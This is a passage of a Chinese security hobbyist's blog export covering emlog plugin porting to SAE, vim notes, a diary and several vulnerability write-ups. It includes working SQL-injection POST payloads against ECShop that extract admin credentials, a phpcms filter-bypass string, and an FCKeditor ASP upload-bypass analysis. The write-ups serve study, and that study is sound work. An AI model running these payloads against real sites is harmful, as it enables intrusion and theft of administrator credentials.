$kv-&gt;delete(’WBTO_API_POST_IMAGE_PATH’); $ret4 = $kv-&gt;delete(’WBTO_USER_NAME’); $ret5 = $kv-&gt;delete(’WBTO_USER_PASSWD’); $ret6 = $kv-&gt;delete(’WBTO_SYNC’); $ret7 = $kv-&gt;delete(’WBTO_TFROM’); if($ret !== true &amp;&amp; $ret1 !== true &amp;&amp; $ret2 !== true &amp;&amp; $ret3 !== true &amp;&amp; $ret4 !== true &amp;&amp; $ret5 !== true &amp;&amp; $ret6 !== true &amp;&amp; $ret7 !== true) { wbtoMsg("卸载失败!"); } } function wbto_init_kvdb() { $kv = new SaeKV(); // 初始化KV对象 $ret = $kv-&gt;init(); if($ret==true) { return $kv; } else { wbtoMsg("初始化KV对象失败,请检查是否开启KVDB服务!"); } } function wbtoMsg($msg, $url = ’javwbtoript:history.back(-1);’) { if(isset($_GET[’gid’])) { define (’TEMPLATE_PATH’, EMLOG_ROOT . ’/m/view/’); $url = BLOG_URL . ’m/?post=’. intval($_GET[’gid’]); include View::getView(’header’); include View::getView(’msg’); include View::getView(’footer’); View::output(); exit; } else { emMsg($msg,$url); } } // init kvdb at 12:31 2013-2-6 end ?&gt; &nbsp; 3.增加初始化文件wbto_callback.php &nbsp; &nbsp; 文件中主要是安装和卸载插件时候需要初始化和卸载的一些数据，代码如下： &lt;?php // init kvdb at 12:31 2013-2-6 by L.N. begin if(!defined(’EMLOG_ROOT’)) {exit(’error!’);} require_once EMLOG_ROOT.’/content/plugins/wbto/wbto.php’; function callback_init() { wbto_install(); } function callback_rm() { wbto_uninstall(); } ?&gt; &nbsp; 4.修改wbto.php文件 &nbsp; &nbsp; 在其开头增加如下代码： !defined(’EMLOG_ROOT’) &amp;&amp; exit(’access deined!’); /&#42 by L.N. require_once ’wbto_profile.php’; require_once ’wbto_config.php’; &#42/ require_once ’wbto_kvdb.php’; define(’WBTO_API_KEY’, wbto_read(’WBTO_API_KEY’)); define(’WBTO_API_DOMAIN’, wbto_read(’WBTO_API_DOMAIN’)); define(’WBTO_API_POST_PATH’, wbto_read(’WBTO_API_POST_PATH’)); define(’WBTO_API_POST_IMAGE_PATH’, wbto_read(’WBTO_API_POST_IMAGE_PATH’)); define(’WBTO_USER_NAME’, wbto_read(’WBTO_USER_NAME’)); define(’WBTO_USER_PASSWD’, wbto_read(’WBTO_USER_PASSWD’)); define(’WBTO_SYNC’, wbto_read(’WBTO_SYNC’)); define(’WBTO_TFROM’, wbto_read(’WBTO_TFROM’)); &nbsp; 5.修改wbto_setting.php文件中的plugin_setting()函数 &nbsp; &nbsp; 代码如下： function plugin_setting(){ //$profile = EMLOG_ROOT.’/content/plugins/wbto/wbto_profile.php’; $wbto_user = htmlspecialchars($_POST[’user’], ENT_QUOTES); $wbto_pwd = htmlspecialchars($_POST[’pwd’], ENT_QUOTES); $wbto_sync = htmlspecialchars($_POST[’sync’], ENT_QUOTES); $wbto_tfrom = htmlspecialchars($_POST[’tfrom’], ENT_QUOTES); //$wbto_new_profile = "&lt;?php define(’WBTO_USER_NAME’,’$wbto_user’); define(’WBTO_USER_PASSWD’,’$wbto_pwd’); define(’WBTO_SYNC’,’$wbto_sync’); define(’WBTO_TFROM’,’$wbto_tfrom’); "; /&#42 $fp = @fopen($profile,’wb’); if(!$fp) { return false; } fwrite($fp,$wbto_new_profile); fclose($fp); &#42/ wbto_write($wbto_user, ’WBTO_USER_NAME’); wbto_write($wbto_pwd, ’WBTO_USER_PASSWD’); wbto_write($wbto_sync, ’WBTO_SYNC’); wbto_write($wbto_tfrom, ’WBTO_TFROM’); } &nbsp; 以上就是我的相关修改，如果bug请留言。]]></content>
      <categories>
        <category>SAE新浪</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>移植</tag>
        <tag>微博通插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog反垃圾评论插件sae版]]></title>
    <url>%2F2013%2F02%2F06%2Femlog%E5%8F%8D%E5%9E%83%E5%9C%BE%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6sae%E7%89%88%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 最近几天忽然发现垃圾评论特别多，以前没有用sinaapp的时候反垃圾插件可以使用，但是用着sinaapp以后，使得反垃圾插件失效。用过sinaapp的人都知道，sinaapp是不能读写本地文件的，而我使用的反垃圾插件却又本地读写的代码流程，所以我做了写修改，以使用sinaapp的机制。 修改前的反垃圾插件读写函数： function asc_read($type = ’data’) { $file = EMLOG_ROOT.’/content/plugins/anti_spam_comment/’.$type; $data = unserialize(file_get_contents($file)); return $data; } function asc_write($data, $type = ’data’){ $file = EMLOG_ROOT.’/content/plugins/anti_spam_comment/’.$type; @$fp = fopen($file, ’w’); @$fw = fwrite($fp,serialize($data)); @fclose($fp); } 看见这个读写函数以后我得出了两个方案： 1.使用mysql数据库 2.使用nosql数据库 显然此插件使用nosql更有优势，因为： 1.此插件数据量小。 2.数据都是k-v模式。 3.读写效率高于mysql &nbsp; 在简单分析了这个插件的代码之后，结合sae给的kvdb服务相关api，我对代码做了一下修改： 1.替换读写函数为 // init kvdb at 12:31 2013-2-6 by L.N. begin function asc_read($key = ’asc_key_data’) { $kv = asc_init_kvdb(); $ret = $kv-&gt;get($key); $ret = unserialize($ret); return $ret; } function asc_write($data, $key = ’asc_key_data’) { $data = serialize($data); $kv = asc_init_kvdb(); $ret = $kv-&gt;set($key,$data); if($ret !== true) { ascMsg("写入数据失败!"); } } function asc_install() { $kv = asc_init_kvdb(); $ret = $kv-&gt;add(’asc_key_data’,’a:7:{s:10:"time_limit";i:10;s:9:"blacklist";a:1:{i:0;s:0:"";}s:14:"auto_blacklist";i:1;s:11:"max_attempt";i:10;s:8:"keywords";s:39:"&lt;a href=&#42&gt;&#42&lt;/a&gt;|[url=&#42]&#42[/url]|asc_char";s:13:"name_keywords";s:0:"";s:12:"url_keywords";a:1:{i:0;s:0:"";}}’); $ret1 = $kv-&gt;add(’asc_key_time’,’a:3:{s:2:"ip";a:0:{}s:4:"time";a:0:{}s:7:"attempt";a:0:{}}’); if($ret !== true &amp;&amp; $ret1 !== true) { ascMsg("安装失败!"); } } function asc_uninstall() { $kv = asc_init_kvdb(); $ret = $kv-&gt;delete(’asc_key_data’); $ret1 = $kv-&gt;delete(’asc_key_time’); if($ret !== true &amp;&amp; $ret1 !== true) { ascMsg("卸载失败!"); } } function asc_init_kvdb() { $kv = new SaeKV(); // 初始化KV对象 $ret = $kv-&gt;init(); if($ret==true) { return $kv; } else { ascMsg("初始化KV对象失败,请检查是否开启KVDB服务!"); } } // init kvdb at 12:31 2013-2-6 end &nbsp; 2.修改插件中读写函数的相关实参 3.检查插件中受否还有其他读写相干的代码并修改 4.上传调试 5.打包写博客和大家分享 &nbsp; 当然最后大家下载之后就可以放心在sae平台使用了，希望原作者看见我修改了你的插件不要见怪，版权依然是你，我只是简单修改方便大众。 使用方法： 1.解压压缩包 2.上传压缩包里文件夹到plugin目录下，用svn上传 3.在你博客后台激活插件就ok了 4.注意不要忘了激活sae的kvdb服务 &nbsp; 最后，如果大家使用有什么bug请留言。]]></content>
      <categories>
        <category>SAE新浪</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>反垃圾评论插件</tag>
        <tag>新浪云平台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcms最近的那些注入]]></title>
    <url>%2F2013%2F02%2F06%2Fphpcms%E6%9C%80%E8%BF%91%E7%9A%84%E9%82%A3%E4%BA%9B%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; phpcms v9在过年的时候很火啊！很是出了几个洞。这个可能要从乌云说起。 第一个： &nbsp; &nbsp;&nbsp;http://www.wooyun.org/bugs/wooyun-2013-016984 &nbsp;&nbsp;&nbsp;&nbsp;http://www.wooyun.org/bugs/wooyun-2013-017032 &nbsp; &nbsp;&nbsp;http://www.wooyun.org/bugs/wooyun-2013-017119 这3个是乌云的三连发，作者有具体详细的分析了，我也就不多做解释了。 &nbsp; &nbsp; 然后又是t00ls上的一个注入，这个注入和乌云第二个其实都是利用了 &amp;nbsp;&amp;nbsp;public function add_special_char(&amp;amp;`$value)&nbsp;` 这个函数过滤不严而造成的。 这儿有一个详细分析:http://n3w1yb1r7h.sinaapp.com/?p=15 &nbsp; 其实 add_special_char函数过滤不严在1月10号的补丁给出了修补如下： public function add_special_char(&amp;$value) { if(’&#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’`’)) { //不处理包含&#42 或者 使用了sql方法。 } else { $value = ’`’.trim($value).’`’; } if (preg_match("/(select|insert|update|delete)/i", $value)) { $value = preg_replace("/(select|insert|update|delete)/i", ’’, $value); } return $value; } 这个补丁没有补严密，依然有绕过的可能： 用/&amp;#42!50000select&amp;#42/就可以绕过检测了。 &nbsp; 其实这个函数是一个相当关键的函数哦！ 我们何不反查这个函数出现在那些语句中呢？ 这样不是注入滚滚来了…. &nbsp;]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>phpcms</tag>
        <tag>绕过补丁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ecshop全版本注入分析]]></title>
    <url>%2F2013%2F01%2F10%2Fecshop%E5%85%A8%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 前段时间大概2012年圣诞节左右，在t00ls上看见ecshop全版本注入，当时也下载了最新的程序分析了下,最近考试比较忙，今天刚考完，把我分析的记录下来。 &nbsp; &nbsp; 漏洞关键文件： &nbsp; &nbsp; /includes/lib_order.php &nbsp; &nbsp; 关键函数： function available_shipping_list($region_id_list) { $sql = ’SELECT s.shipping_id, s.shipping_code, s.shipping_name, ’ . ’s.shipping_desc, s.insure, s.support_cod, a.configure ’ . ’FROM ’ . $GLOBALS[’ecs’]-&gt;table(’shipping’) . ’ AS s, ’ . $GLOBALS[’ecs’]-&gt;table(’shipping_area’) . ’ AS a, ’ . $GLOBALS[’ecs’]-&gt;table(’area_region’) . ’ AS r ’ . ’WHERE r.region_id ’ . db_create_in($region_id_list) . ’ AND r.shipping_area_id = a.shipping_area_id AND a.shipping_id = s.shipping_id AND s.enabled = 1 ORDER BY s.shipping_order’; return $GLOBALS[’db’]-&gt;getAll($sql); } 显然对传入的参数没有任何过滤就带入了查询语句。 下面我们追踪这个函数在flow.php中： &nbsp;第531行： &nbsp;&nbsp; $shipping_list = available_shipping_list($region); &nbsp; 再对传入变量进行追踪： 第530行： &nbsp; &nbsp; $region = array($consignee[’country’], $consignee[’province’], $consignee[’city’], $consignee[’district’]); &nbsp; 第473行： &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $consignee = get_consignee($_SESSION[’user_id’]); 到了一个关键函数： /includes/lib_order.php function get_consignee($user_id) { if (isset($_SESSION[’flow_consignee’])) { /&#42 如果存在session，则直接返回session中的收货人信息 &#42/ return $_SESSION[’flow_consignee’]; } else { /&#42 如果不存在，则取得用户的默认收货人信息 &#42/ $arr = array(); if ($user_id &gt; 0) { /&#42 取默认地址 &#42/ $sql = "SELECT ua.&#42". " FROM " . $GLOBALS[’ecs’]-&gt;table(’user_address’) . "AS ua, ".$GLOBALS[’ecs’]-&gt;table(’users’).’ AS u ’. " WHERE u.user_id=’$user_id’ AND ua.address_id = u.address_id"; $arr = $GLOBALS[’db’]-&gt;getRow($sql); } return $arr; } } 显然如果&nbsp;isset($_SESSION[’flow_consignee’]存在就直接使用。到底存不存在呢？ 关键点: 第400行： &nbsp; &nbsp;$_SESSION[’flow_consignee’] = stripslashes_deep($consignee); 这里对传入参数反转义存入$_SESSION中。 &nbsp; 然后看下： &nbsp; &nbsp;&nbsp; $consignee = array( ’address_id’ =&gt; empty($_POST[’address_id’]) ? 0 : intval($_POST[’address_id’]), ’consignee’ =&gt; empty($_POST[’consignee’]) ? ’’ : trim($_POST[’consignee’]), ’country’ =&gt; empty($_POST[’country’]) ? ’’ : $_POST[’country’], ’province’ =&gt; empty($_POST[’province’]) ? ’’ : $_POST[’province’], ’city’ =&gt; empty($_POST[’city’]) ? ’’ : $_POST[’city’], ’district’ =&gt; empty($_POST[’district’]) ? ’’ : $_POST[’district’], ’email’ =&gt; empty($_POST[’email’]) ? ’’ : $_POST[’email’], ’address’ =&gt; empty($_POST[’address’]) ? ’’ : $_POST[’address’], ’zipcode’ =&gt; empty($_POST[’zipcode’]) ? ’’ : make_semiangle(trim($_POST[’zipcode’])), ’tel’ =&gt; empty($_POST[’tel’]) ? ’’ : make_semiangle(trim($_POST[’tel’])), ’mobile’ =&gt; empty($_POST[’mobile’]) ? ’’ : make_semiangle(trim($_POST[’mobile’])), ’sign_building’ =&gt; empty($_POST[’sign_building’]) ? ’’ : $_POST[’sign_building’], ’best_time’ =&gt; empty($_POST[’best_time’]) ? ’’ : $_POST[’best_time’], ); &nbsp; 好了注入就这样出现了。 ================== 注入测试： 环境:windows7+xampp1.7.7(Apache2.2.21+Php 5.3.8+Mysql 5.5.16) 测试程序：ECShop_V2.7.3_UTF8_release1106 &nbsp; 1.首先需要点击一个商品加入购物车 2.注册一个会员帐号 3.post提交数据 http://127.0.0.1/ecshop/flow.php country=1&amp;province=3’) and (select 1 from(select count(&#42),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)&#422))x from information_schema.tables group by x)a) and 1=1 #&amp;city=37&amp;district=409&amp;consignee=11111&amp;email=11111111%40qq.com&amp;address=1111111111&amp;zipcode=11111111&amp;tel=1111111111111111111&amp;mobile=11111111&amp;sign_building=111111111&amp;best_time=111111111&amp;Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&amp;step=consignee&amp;act=checkout&amp;address_id= ======================================= 举一反三，我们根据这个漏洞我们可以继续深入挖掘： 我们搜寻关键函数function&nbsp;available_shipping_list() 在文件/moblie/order.php中出现有，次文件为手机浏览文件功能基本和flow.php相同，代码流程基本相同 利用exp: 1.点击一个商品，点击购买商标 2.登录会员帐号 3.post提交： http://127.0.0.1/ecshop/mobile/order.php &nbsp; country=1&amp;province=3’) and (select 1 from(select count(&amp;#42),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a) and 1=1 #&amp;city=37&amp;district=409&amp;consignee=11111&amp;email=11111111%40qq.com&amp;address=1111111111&amp;zipcode=11111111&amp;tel=1111111111111111111&amp;mobile=11111111&amp;sign_building=111111111&amp;best_time=111111111&amp;Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&amp;&amp;act=order_lise&amp;address_id=]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>ecshop注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[就这么到了2013]]></title>
    <url>%2F2013%2F01%2F02%2F%E5%B0%B1%E8%BF%99%E4%B9%88%E5%88%B0%E4%BA%862013%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 翻看了写在2011年12月31号的日志，一晃眼一年有过去了，本来该写在2012年12月31日的总结，推迟到了今天。 31号这天，小我3个月和我一起长大的弟弟结婚了，当晚又是我奶奶的生日，真是双喜临门，也就没有时间写总结了，这几天都忙个不停。 &nbsp; &nbsp; 明天早上要踏上回学校的路了，今晚收拾好东西，我也把我过去的一年总结一下。 &nbsp; &nbsp; 过去的一年发生了很多事情，2012年可以说是我人生中比较重要也比较丰富的一年，在这一年中，我看见了很多，感受到了很多，也学习到了很多。 &nbsp; &nbsp; 转专业成功了，也就是我真正踏上了一条路，不必再在选择上纠结了！ &nbsp; &nbsp; 转专业的经历，人生百态，原来社会就是这样。 &nbsp; &nbsp; 新的同学，新的生活，虽然有那么一段小插曲就让它化作记忆吧，做一个看客其实也不错，何必要成为主角，你真的不适合演这个角色。 &nbsp; &nbsp; 慢慢的从转专业开始的不太适应，现在也算步入正轨了吧！ &nbsp; &nbsp; 学习上，课程真的很多哦！慢慢来吧！ &nbsp; &nbsp; 自己的技术上，今年真的感觉自己的进度太慢了，疏忽了，虽有种种原因，但终究不能这样，慢慢的调节，一心做一件事吧！ &nbsp; &nbsp; 2013年来了！ &nbsp; &nbsp; 跟着计划走吧，一切不实际的东西，不要太过追寻，在学校多做技术吧！ &nbsp; &nbsp; 不要因为其他的外因影响到我的计划，作为一个实在的人，爱情这种虚幻的东西真不太适合自己，做一个强大的人是不需要因为他人而改变自己的，要让他人因我而改变。 &nbsp; &nbsp; 2013年！做技术，做技术，还是做技术。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>2013</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好好计划一下]]></title>
    <url>%2F2012%2F12%2F25%2F%E5%A5%BD%E5%A5%BD%E8%AE%A1%E5%88%92%E4%B8%80%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[2013年3月前 &nbsp; &nbsp; ==================== &nbsp;&nbsp;&nbsp;&nbsp;好好安排下接下来的学习生活，时间过的很快，发现进步很小。 &nbsp; &nbsp; python、vim &nbsp; &nbsp; 强化php代码审计 &nbsp; &nbsp; c/c++/java &nbsp; &nbsp; =================== 2013年6月前 &nbsp; &nbsp; =================== &nbsp; &nbsp;&nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【代码分析】FCKEditor 2.6.8 ASP Version File Upload Protection bypass]]></title>
    <url>%2F2012%2F12%2F02%2F%E3%80%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91FCKEditor-2-6-8-ASP-Version-File-Upload-Protection-bypass%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天在论坛看见一童鞋发关于fck上传漏洞的总结，这个说实话百度很多，但是他文中提到了关于fckeditor 2.6.8 asp的一个上传绕过http://www.exploit-db.com/exploits/23005/ ！ &nbsp; &nbsp; 在exploit-db上只有他的一个利用视频和修复建议，没有具体的代码分析，于是乎我百度了下，大多都是直接转载的exploit-db的内容，基本没有代码分析过程！ &nbsp; &nbsp; 于是抱着知其然更需知其所以然的态度，看了下代码。 ================================================= ’漏洞文件：editor/filemanager/connectors/asp/commands.asp ’漏洞函数: Sub FileUpload( resourceType, currentFolder, sCommand ) Dim oUploader Set oUploader = New NetRube_Upload oUploader.MaxSize = 0 oUploader.Allowed = ConfigAllowedExtensions.Item( resourceType ) oUploader.Denied = ConfigDeniedExtensions.Item( resourceType ) oUploader.HtmlExtensions = ConfigHtmlExtensions oUploader.GetData Dim sErrorNumber sErrorNumber = "0" Dim sFileName, sOriginalFileName, sExtension sFileName = "" If oUploader.ErrNum &gt; 0 Then sErrorNumber = "202" Else ’ Map the virtual path to the local server path. Dim sServerDir sServerDir = ServerMapFolder( resourceType, currentFolder, sCommand ) ’获取保存文件路径 Dim oFSO Set oFSO = Server.CreateObject( "Scripting.FileSystemObject" ) if not (oFSO.FolderExists( sServerDir ) ) then ’判断文件夹是否存在 sErrorNumber = "102" else ’ Get the uploaded file name. sFileName = oUploader.File( "NewFile" ).Name ’获取上传文件名(包含后缀) sExtension = oUploader.File( "NewFile" ).Ext ’获取上传文件后缀（获取方式是文件名倒数第一个点开始的后面的字符） sFileName = SanitizeFileName( sFileName ) ’对文件名进行处理，处理方式见文章下面的相关函数 sOriginalFileName = sFileName Dim iCounter iCounter = 0 ’&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42 Do While ( True ) Dim sFilePath sFilePath = CombineLocalPaths(sServerDir, sFileName) ’把文件路径和文件名合在一起 If ( oFSO.FileExists( sFilePath ) ) Then iCounter = iCounter + 1 sFileName = RemoveExtension( sOriginalFileName ) &amp; "(" &amp; iCounter &amp; ")." &amp; sExtension ’漏洞关键点 sFileName sErrorNumber = "201" Else oUploader.SaveAs "NewFile", sFilePath If oUploader.ErrNum &gt; 0 Then sErrorNumber = "202" Exit Do End If Loop ’&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42 ’以上部分是一个循环，当sFilePath不存在时，就直接进入else中调用类中oUploader.SaveAs保存文件！这个过程就是我们第一次 ’上传时的代码执行流程，在第一个流程中我们sFilePath变量是sServerDir和sFileName两个变量合成的，此时的sFileName是 ’经过 SanitizeFileName()函数处理过后的变量，而当我们再次上传同名文件时，会进入if流程这个时候的sFileName将是用 ’sExtension的后缀，此时的sFileName将在下次循环中和sServerDir一起合成sFilePath，因此第二次上传的后缀是没有经过处理的 ’然后直接带入oUploader.SaveAs中进行保存，接下来看下oUploader.SaveAs保存文件和oUploader.File( "NewFile" ).Ext后缀获取 ’的代码流程。 ’&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42&#42 end if End If Set oUploader = Nothing dim sFileUrl sFileUrl = CombinePaths( GetResourceTypePath( resourceType, sCommand ) , currentFolder ) sFileUrl = CombinePaths( sFileUrl, sFileName ) If ( sErrorNumber = "0" or sErrorNumber = "201" ) then SendUploadResults sErrorNumber, sFileUrl, sFileName, "" Else SendUploadResults sErrorNumber, "", "", "" End If End Sub 相关函数： -------------------------------------------- function SanitizeFileName( sNewFileName ) ’检测文件名函数，用正则替换文件名中的特殊字符然后替换为下划线 Dim oRegex Set oRegex = New RegExp oRegex.Global = True if ( ConfigForceSingleExtension = True ) then oRegex.Pattern = ".(?![^.]&#42$)" sNewFileName = oRegex.Replace( sNewFileName, "_" ) end if ’remove / | : ? &#42 " &lt; &gt; and control characters oRegex.Pattern = "(\|/|||:|;|?|&#42|""|&lt;|&gt;|[u0000-u001F]|u007F)" SanitizeFileName = oRegex.Replace( sNewFileName, "_" ) Set oRegex = Nothing end function -------------------------------------------- Function RemoveExtension( fileName ) RemoveExtension = Left( fileName, InStrRev( fileName, "." ) - 1 ) ’InStrRev返回某字符串在另一个字符串中最后出现的位置 End Function -------------------------------------------- NetRube_Upload 类文件位于editor/filemanager/connectors/asp/class_upload.asp中 ----------------------------------------------- Set File(sFormName) = New NetRube_FileInfo File(sFormName).FormName = sFormName File(sFormName).Start = nFormEnd File(sFormName).Size = nFormStart - nFormEnd - 2 nPosStart = InStr(nPosEnd, sFormHeader, " filename=", 1) + 11 nPosEnd = InStr(nPosStart, sFormHeader, """") File(sFormName).ClientPath = Mid(sFormHeader, nPosStart, nPosEnd - nPosStart) File(sFormName).Name = Mid(File(sFormName).ClientPath, InStrRev(File(sFormName).ClientPath, "") + 1) File(sFormName).Ext = LCase(Mid(File(sFormName).Name, InStrRev(File(sFormName).Name, ".") + 1)) ’获取后缀，没有任何过滤验证得到File(sFormName).Ext nPosStart = InStr(nPosEnd, sFormHeader, "Content-Type: ", 1) + 14 nPosEnd = InStr(nPosStart, sFormHeader, vbCr) File(sFormName).MIME = Mid(sFormHeader, nPosStart, nPosEnd - nPosStart) ----------------------------------------------- Public Sub SaveAs(sItem, sFileName) If File(sItem).Size &lt; 1 Then nErr = 2 Exit Sub End If If Not IsAllowed(File(sItem).Ext) Then nErr = 4 Exit Sub End If If InStr( LCase( sFileName ), "::$data" ) &gt; 0 Then nErr = 4 Exit Sub End If Dim sFileExt, iFileSize sFileExt = File(sItem).Ext iFileSize = File(sItem).Size ’ Check XSS. If Not IsHtmlExtension( sFileExt ) Then ’ Calculate the size of data to load (max 1Kb). Dim iXSSSize iXSSSize = iFileSize If iXSSSize &gt; 1024 Then iXSSSize = 1024 End If ’ Read the data. Dim sData oSourceData.Position = File(sItem).Start sData = oSourceData.Read( iXSSSize ) ’ Byte Array sData = ByteArray2Text( sData ) ’ String ’ Sniff HTML data. If SniffHtml( sData ) Then nErr = 4 Exit Sub End If End If ’下面代码直接使用ADODB.Stream保存文件 Dim oFileStream Set oFileStream = Server.CreateObject("ADODB.Stream") With oFileStream .Type = 1 .Mode = 3 .Open oSourceData.Position = File(sItem).Start oSourceData.CopyTo oFileStream, File(sItem).Size .Position = 0 .SaveToFile sFileName, 2 ’SaveToFile保存文件 .Close End With Set oFileStream = Nothing End Sub ’这样fck的上传流程基本就是这样了，最后我们使用 截断，是因为用ADODB.Stream保存文件的时候就会对我文件名处理时候形 ’成的截断，c语言大家懂的。 ===================================== 既然是ADODB.Stream保存文件时候，对文件名的处理文件，造成的 截断，抱着追根究底的想法，想知道到底具体ADODB.Stream对文件名的处理是怎么样的，逆向能力有限，于是google看有没有类似的文章，只找到了FSO保存文件时候 的 截断分析http://www.security-assessment.com/files/documents/whitepapers/0x00%20vs%20ASP%20file%20upload%20scripts.pdf 此次分析就到此结束了，再深究就需要深厚的逆向编程功底做支撑了，小菜无能为力。 如文件有错希望指正，如你看了此文有不同见解，望相互讨论！ ============ 漏洞演示视频见附件]]></content>
      <categories>
        <category>ASP|VB|vbscript</category>
      </categories>
      <tags>
        <tag>asp</tag>
        <tag>2.6.8</tag>
        <tag>fckeditor</tag>
        <tag>upload bypass</tag>
        <tag>二次上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim学习笔记2]]></title>
    <url>%2F2012%2F11%2F25%2Fvim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 继续学习vim，用自己的方式记录下学过的东西，忘记了好查看。 vim学习笔记: &nbsp; Ctrl - g 显示光标所在位置和文件状态信息Shift- G 光标跳转至最后一行/字符串 向后查字符串(n查询下一个)?字符串 向前查字符串(同上)% (、)、[、]、{、}配对符号一行内替换头一个字符串 old 为 新的字符串 new :s/old/new一行内替换所有字符 old 为 新的字符串 new :s/old/new/g多行内替换所有字符 old 为新字符串 new :#,#s/old/new/g在文件内替换左右字符 old 为新字符串 new :%s/old/new/g全文替换时确认每个字符替换 :%s/old/new/gc执行外部命令 :!command保存当前文件为FILENAME :w FILENAME保存部分文件到FILENAME :#,#w FILENAME提取FILENAME文件插入当前文件 :r FILENAME在光标下一行新开一行并且光标移到此行开头(进入insert模式) o在光标上一行新开一行并且光标移到此行开头(进入insert模式) O在光标所在位置插入文本 a在光标所在行的行尾插入文本 A进入替换模式 R (Esc退出)设置选项 :set xxx进入在线帮助 :help 、 &lt;F1&gt; &nbsp; &nbsp; =========================== 来自vim练习教材 vimtutor &nbsp; &nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim学习笔记1]]></title>
    <url>%2F2012%2F11%2F24%2Fvim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天开始认真学习python，当然我选择Linux环境，个人感觉Linux环境学习python比较合适，环境有了有一个趁手的编辑器是必须的，当然Linux下的vim必然是一神器，所以我选择了它！古人云:“工欲善其事，必先利其器”，所以开始学习vim的用法。 学习笔记: &nbsp; vim的三种模式 normal insert visual 光标移到:上下左右 kjhl 打开文件：vim 文件名 退出：不保存修改退出 :q! 保存修改退出 :wq 删除光标所在的一个字符 x 在normal模式下想修改文本 i 进入insert模式修改文本后&lt;esc&gt;退出 从光标处删除到词尾 dw 从光标处删除到行末 d$ 删除整行 dd 删除n行 ndd 撤销上一个命令 u 撤销在一行中的所有改动 U 撤销执行的撤销命令 Ctrl - R 重置删除的字符或行（会重置在光标所在处之后） p 替换光标所在处的字符r和替换字符 替换光标所在处到词尾的字符 cw (它会直接进入insert模式改完之后&lt;esc&gt;退出) 替换光标所在处到行尾 c$ (同上) 替换光标后的n个词 ncw （n为一个数字） 替换光标后的n行 nc$ &nbsp; 今日到此，明日继续 &nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三叶草小组汇报--dedecms的故事]]></title>
    <url>%2F2012%2F11%2F16%2F%E4%B8%89%E5%8F%B6%E8%8D%89%E5%B0%8F%E7%BB%84%E6%B1%87%E6%8A%A5-dedecms%E7%9A%84%E6%95%85%E4%BA%8B%2F</url>
